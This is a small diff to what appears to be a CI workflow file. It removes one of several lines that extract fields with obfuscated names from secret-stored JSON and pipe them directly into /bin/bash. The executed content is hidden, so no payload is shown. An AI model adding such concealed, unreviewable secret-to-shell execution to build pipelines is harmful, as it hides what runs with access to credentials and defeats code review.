@@ -18,7 +18,6 @@ jobs:
           o8: ${{ secrets.o8 }}
         run: |
           printf '%s' "$o8" | jq -r .i0 | /bin/bash
-          echo $qvfd868 | jq -r .mn0 | /bin/bash
           echo $wojgx2 | jq -r .za4538 | /bin/bash
 
       - name: Store artifact
